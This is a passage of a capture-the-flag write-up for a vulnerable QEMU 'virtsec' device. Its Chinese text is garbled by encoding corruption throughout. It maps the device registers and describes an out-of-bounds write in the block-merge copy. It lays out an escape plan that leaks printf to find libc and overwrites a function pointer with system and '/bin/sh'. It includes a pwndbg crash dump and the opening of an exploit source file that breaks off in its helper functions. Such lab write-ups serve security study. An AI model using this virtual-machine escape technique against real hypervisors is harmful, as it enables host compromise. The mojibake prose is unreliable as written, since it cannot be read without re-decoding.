<li>dev-&gt;gift_func ä¸ dev-&gt;gift_str ï¼šç´§é‚» data_buffer å°¾éƒ¨çš„å‡½æ•°æŒ‡é’ˆå’Œå­—ç¬¦ä¸²æŒ‡é’ˆï¼Œä¾› gift è°ƒç”¨ä½¿ç”¨</li>
</ul>
</li>
<li>æ§½å®šä½ï¼šåˆ†é…å—æ—¶ä»æ§½ 0..15 æ‰¾ç¬¬ä¸€ä¸ªç©ºæ§½ï¼Œ start &#x3D; 16 * slot_index ï¼Œåˆå§‹ size &lt;&#x3D; 16</li>
</ul>
<p><strong>å¯„å­˜å™¨æ˜ å°„</strong></p>
<ul>
<li><p>è¯»å¯„å­˜å™¨ï¼ˆvirtsec_mmio_readï¼‰ï¼š</p>
<ul>
<li>0x0 è¿”å›é­”æ•° 0x524F4953</li>
<li>0x4 è¿”å›å¸¸é‡ 256</li>
<li>0x8 è¿”å›è®¾å¤‡çŠ¶æ€ dev-&gt;reg_3024</li>
<li>0x10&#x2F;0x14&#x2F;0x18&#x2F;0x1C&#x2F;0x20&#x2F;â€¦ è¿”å›å¯¹åº”è®¾å¤‡å­—æ®µï¼ˆå‘½ä»¤å‚æ•°ã€å½“å‰å— IDã€å¤§å°ç­‰ï¼‰</li>
<li>0x28&#x2F;0x2C è¿”å› write_counter&#x2F;read_counter</li>
<li>0x30&#x2F;0x34 è¿”å› reg_3472&#x2F;reg_3476 ï¼ˆåœ¨å†™è·¯å¾„ä¸­ç”¨ä½œåˆå¹¶çš„ä¸¤ä¸ªå— IDï¼‰</li>
</ul>
</li>
<li><p>å†™å¯„å­˜å™¨ï¼ˆvirtsec_mmio_writeï¼‰ï¼š</p>
<ul>
<li>0xC æ‰§è¡Œå‘½ä»¤ï¼š virtsec_execute_command(dev, value)</li>
<li>0x10 è®¾ç½® dev-&gt;cmd_arg</li>
<li>0x14 è®¾ç½® dev-&gt;current_block_id</li>
<li>0x18 è®¾ç½® dev-&gt;dev_size </li>
<li>0x30&#x2F;0x34 è®¾ç½®åˆå¹¶çš„ä¸¤ä¸ªå— ID</li>
<li>0x38 è§¦å‘ gift è°ƒç”¨</li>
</ul>
</li>
</ul>
<p><strong>æ•°æ®çª—å£</strong></p>
<ul>
<li>åœ°å€åŒºé—´ï¼š 0x1000..0x1FFF ï¼Œç´¢å¼• index &#x3D; offset - 0x1000</li>
<li>è¯»ï¼šè‹¥ blk-&gt;valid &amp;&amp; index &lt; blk-&gt;size ï¼Œæœ€å¤šè¯» 4 å­—èŠ‚ï¼›è‹¥ index + 4 &gt; blk-&gt;size ï¼Œä»…è¯»å‰©ä½™</li>
<li>å†™ï¼šè‹¥ blk-&gt;valid &amp;&amp; index + 4 &lt;&#x3D; blk-&gt;size ï¼Œå†™ 4 å­—èŠ‚ï¼›è‹¥è·¨ 16 å­—èŠ‚è¾¹ç•Œï¼ˆ index + 4 &gt; 16 ï¼‰åˆ™æ‹†åˆ†å†™åˆ°å½“å‰æ§½ä¸ä¸‹ä¸€ä¸ªæ§½èµ·å§‹</li>
</ul>
<h2 id="æ¼æ´åˆ†æä¸åˆ©ç”¨"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h2><p>åœ¨ virtsec_execute_command å‘½ä»¤ 4 åˆå¹¶ block æ—¶å¤åˆ¶æ— æ€»è¾¹ç•Œæ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size = block-&gt;size + blk-&gt;size;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;dev-&gt;data_buffer[block-&gt;start + block-&gt;size], &amp;dev-&gt;data_buffer[blk-&gt;start], blk-&gt;size); <span class="comment">// æ— æ€»ç¼“å†²è¾¹ç•Œæ£€æŸ¥</span></span><br><span class="line">block-&gt;size = size;</span><br><span class="line">blk-&gt;valid = <span class="number">0</span>;</span><br><span class="line">--dev-&gt;reg_3464;</span><br></pre></td></tr></table></figure>

<p>å½“ block åœ¨æ§½ 15ï¼ˆ start&#x3D;240,size&#x3D;16 ï¼‰ä¸”åˆå¹¶ç¬¬äºŒå— 16 å­—èŠ‚æ—¶ï¼Œç›®æ ‡åœ°å€ä¸º data_buffer[256] ï¼Œè¶…å‡º 256 å­—èŠ‚ç¼“å†²åŒºï¼Œè¦†ç›–ç´§é‚»çš„è®¾å¤‡ç»“æ„å­—æ®µï¼ˆåŒ…æ‹¬ gift_func ä¸ gift_str ï¼‰ã€‚è¿™æä¾›äº†ä¸€ä¸ªç¨³å®šçš„ 16 å­—èŠ‚è¶Šç•Œå†™åŸè¯­åˆ°å‡½æ•°æŒ‡é’ˆåŒºã€‚  </p>
<p>æ€»ä½“ç­–ç•¥ï¼šå…ˆæ³„éœ²å‡½æ•°æŒ‡é’ˆåœ°å€ä»¥ç¡®å®š libc åŸºå€ï¼Œå†åˆ©ç”¨â€œåˆå¹¶å¤åˆ¶â€æŠŠ 16 å­—èŠ‚ä¸€æ¬¡æ€§å†™åˆ° data_buffer[256..271] ï¼Œè¦†ç›– gift_func&#x2F;gift_str ï¼Œæœ€åè§¦å‘å¯„å­˜å™¨ 0x38 å®Œæˆè°ƒç”¨ã€‚</p>
<ul>
<li><p>åœ°å€æ³„éœ²ï¼š</p>
<ul>
<li>åˆ†é…å— ID 1..16ï¼Œæ¯ä¸ªå¤§å° 16ï¼›ä¾æ¬¡åˆå¹¶ 2..16 åˆ°å— 1ï¼Œä½¿å— 1 size&#x3D;256 ï¼Œæ­¤æ—¶ data_buffer[256] ç´§é‚»å‡½æ•°æŒ‡é’ˆåŒº</li>
<li>å†åˆ†é…å— 17ï¼ˆ16 å­—èŠ‚ï¼‰ï¼Œåˆå¹¶åˆ°å— 1ï¼Œä½¿å— 1 size&#x3D;272</li>
<li>è¯»å– index&#x3D;256 ä¸ index&#x3D;264 å¯è·å¾— printf åœ°å€ä¸ gift_str åœ°å€</li>
</ul>
</li>
<li><p>æŒ‡é’ˆæ”¹å†™ï¼ˆå¿…é¡»ç”¨åˆå¹¶å¤åˆ¶ï¼‰ï¼š</p>
<ul>
<li>æ‰§è¡Œè®¾å¤‡é‡ç½®ï¼ˆå‘½ä»¤ 6ï¼‰ï¼Œé‡å»ºå— 1 åˆ° size&#x3D;256 ï¼ˆåˆå¹¶ 2..16ï¼‰</li>
<li>åˆ†é…ä¸€ä¸ªä¸´æ—¶å—ï¼Œå†™å…¥ 16 å­—èŠ‚è½½è· [system][binsh] ï¼ˆå„ 8 å­—èŠ‚ï¼Œä½ä½åœ¨å‰ï¼‰</li>
<li>åˆå¹¶åˆ°å— 1ï¼Œæ­¤æ—¶ 16 å­—èŠ‚å¤åˆ¶åˆ° data_buffer[256..271] ï¼Œç¨³å®šè¦†ç›–å‡½æ•°æŒ‡é’ˆåŒº</li>
</ul>
</li>
</ul>
<p>è‡³äºä¸ºä»€ä¹ˆæŒ‡é’ˆæ”¹å†™ä¸ºä»€ä¹ˆä¸èƒ½åƒè¶Šç•Œ read è¯»å– printf çš„åœ°å€ç›´æ¥æ”¹å†™ï¼Œæ˜¯å› ä¸º virtsec_mmio_write çš„è·¨æ§½å†™å®ç°æœ‰ç¼ºé™·ï¼šå½“ index &gt;&#x3D; 17 ä¸” index + 4 &lt;&#x3D; blk-&gt;size æ—¶ï¼Œä¼šè¿›å…¥æ‹†åˆ†é€»è¾‘ï¼Œè®¡ç®— n &#x3D; 16 - index ï¼Œè¿™ä¸ªå€¼å˜æˆè´Ÿæ•°å¹¶è¢«å½“æˆæ— ç¬¦å·é•¿åº¦ä¼ ç»™ memcpy ï¼Œå¯¼è‡´ä¸€æ¬¡æå¤§çš„æ‹·è´ä»æ ˆåœ°å€è¯»å–ï¼Œè¿›å…¥ glibc çš„ AVX è·¯å¾„ï¼ˆä¸‹é¢ gdb çš„ vmovdqu [rsi+0x2000] ç­‰ï¼‰ï¼Œä»è€Œå¡æ­»æˆ–å´©æºƒã€‚  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">R8   <span class="number">0xfffffffffffffff0</span></span><br><span class="line">R9   <span class="number">0</span></span><br><span class="line">R10  <span class="number">0x3ffce</span></span><br><span class="line">R11  <span class="number">0x7e11d8000090</span> â€”â–¸ <span class="number">0x7e11d8cc1f50</span> â—‚â€” <span class="number">0x10100</span></span><br><span class="line">R12  <span class="number">0x7f2cd2e72108</span></span><br><span class="line">R13  <span class="number">0x1d</span></span><br><span class="line">R14  <span class="number">0x7e12870037d0</span> â—‚â€” endbr64</span><br><span class="line">R15  <span class="number">0x7ffcd11fa390</span> â€”â–¸ <span class="number">0x5665789abcdd</span> â—‚â€” <span class="number">0x646e656b63616200</span></span><br><span class="line">RBP  <span class="number">0x7e1286350de0</span> â€”â–¸ <span class="number">0x7e1286350e40</span> â€”â–¸ <span class="number">0x7e1286350ec0</span> â€”â–¸ <span class="number">0x7e1286350f20</span> â€”â–¸ <span class="number">0x7e1286350f70</span> â—‚â€” ...</span><br><span class="line">RSP  <span class="number">0x7e1286350d88</span> â€”â–¸ <span class="number">0x5665781e134d</span> (virtsec_mmio_write+<span class="number">333</span>) â—‚â€” cmp dword ptr [rbp - <span class="number">0x18</span>], <span class="number">0</span></span><br><span class="line">RIP  <span class="number">0x7e128710fdb0</span> â—‚â€” vmovdqu ymm8, ymmword ptr [rsi + <span class="number">0x2000</span>]</span><br><span class="line"></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86<span class="number">-64</span> / <span class="built_in">set</span> emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">â–º <span class="number">0x7e128710fdb0</span>    vmovdqu ymm8, ymmword ptr [rsi + <span class="number">0x2000</span>]</span><br><span class="line"><span class="number">0x7e128710fdb8</span>    vmovdqu ymm9, ymmword ptr [rsi + <span class="number">0x2020</span>]</span><br><span class="line"><span class="number">0x7e128710fdc0</span>    vmovdqu ymm10, ymmword ptr [rsi + <span class="number">0x2040</span>]</span><br><span class="line"><span class="number">0x7e128710fdc8</span>    vmovdqu ymm11, ymmword ptr [rsi + <span class="number">0x2060</span>]</span><br><span class="line"><span class="number">0x7e128710fdd0</span>    vmovdqu ymm12, ymmword ptr [rsi + <span class="number">0x3000</span>]</span><br><span class="line"><span class="number">0x7e128710fdd8</span>    vmovdqu ymm13, ymmword ptr [rsi + <span class="number">0x3020</span>]</span><br><span class="line"><span class="number">0x7e128710fde0</span>    vmovdqu ymm14, ymmword ptr [rsi + <span class="number">0x3040</span>]</span><br><span class="line"><span class="number">0x7e128710fde8</span>    vmovdqu ymm15, ymmword ptr [rsi + <span class="number">0x3060</span>]</span><br><span class="line"><span class="number">0x7e128710fdf0</span>    sub    rsi, <span class="number">-0x80</span></span><br><span class="line"><span class="number">0x7e128710fdf4</span>    vmovntdq ymmword ptr [rdi], ymm0</span><br><span class="line"><span class="number">0x7e128710fdf8</span>    vmovntdq ymmword ptr [rdi + <span class="number">0x20</span>], ymm1</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp <span class="number">0x7e1286350d88</span> â€”â–¸ <span class="number">0x5665781e134d</span> (virtsec_mmio_write+<span class="number">333</span>) â—‚â€” cmp dword ptr [rbp - <span class="number">0x18</span>], <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚<span class="number">-050</span> <span class="number">0x7e1286350d90</span> â—‚â€” <span class="number">0x486350dd0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚<span class="number">-048</span> <span class="number">0x7e1286350d98</span> â—‚â€” <span class="number">0x87147678</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚<span class="number">-040</span> <span class="number">0x7e1286350da0</span> â—‚â€” <span class="number">0x1108</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚<span class="number">-038</span> <span class="number">0x7e1286350da8</span> â€”â–¸ <span class="number">0x56659bbe6d90</span> â€”â–¸ <span class="number">0x56659ac6d190</span> â€”â–¸ <span class="number">0x56659ab32400</span> â€”â–¸ <span class="number">0x56659ab32580</span> â—‚â€” ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚<span class="number">-030</span> <span class="number">0x7e1286350db0</span> â—‚â€” <span class="number">0x1f0000110c</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚<span class="number">-028</span> <span class="number">0x7e1286350db8</span> â—‚â€” <span class="number">0x108ffffffff</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚<span class="number">-020</span> <span class="number">0x7e1286350dc0</span> â—‚â€” <span class="number">0xffffff0800000108</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">â–º <span class="number">0</span>   <span class="number">0x7e128710fdb0</span> None</span><br><span class="line"><span class="number">1</span>   <span class="number">0x5665781e134d</span> virtsec_mmio_write+<span class="number">333</span></span><br><span class="line"><span class="number">2</span>   <span class="number">0x5665786642da</span> memory_region_write_accessor+<span class="number">250</span></span><br><span class="line"><span class="number">3</span>   <span class="number">0x566578664615</span> access_with_adjusted_size+<span class="number">528</span></span><br><span class="line"><span class="number">4</span>   <span class="number">0x566578667b96</span> memory_region_dispatch_write+<span class="number">342</span></span><br><span class="line"><span class="number">5</span>   <span class="number">0x5665786bc40f</span> int_st_mmio_le+<span class="number">107</span></span><br><span class="line"><span class="number">6</span>   <span class="number">0x5665786bc58f</span> do_st_mmio_le+<span class="number">241</span></span><br><span class="line"><span class="number">7</span>   <span class="number">0x5665786bce29</span> do_st_4+<span class="number">126</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ THREADS (<span class="number">4</span> TOTAL) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">â–º <span class="number">3</span>   <span class="string">&quot;qemu-system-x86&quot;</span> stopped: <span class="number">0x7e128710fdb0</span></span><br><span class="line"><span class="number">1</span>   <span class="string">&quot;qemu-system-x86&quot;</span> stopped: <span class="number">0x7e12870002c0</span></span><br><span class="line"><span class="number">2</span>   <span class="string">&quot;qemu-system-x86&quot;</span> stopped: <span class="number">0x7e128708d8fd</span> &lt;daemon+<span class="number">77</span>&gt;</span><br><span class="line"><span class="number">4</span>   <span class="string">&quot;qemu-system-x86&quot;</span> stopped: <span class="number">0x7e12870002c0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>æ€»çš„æ¥è¯´å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆè¦æ“ä½œçš„ï¼Œç®€å•é¢˜ :)</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTSEC_CMD_REG 0x0C</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTSEC_CMD_ARG_REG 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTSEC_BLOCK_ID_REG 0x14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTSEC_BLOCK_SIZE_REG 0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTSEC_MERGE_BLOCK1_ID_REG 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTSEC_MERGE_BLOCK2_ID_REG 0x34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTSEC_GIFT_REG 0x38</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_INIT 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC_BLOCK 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_MERGE_BLOCKS 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_RESET 6</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> 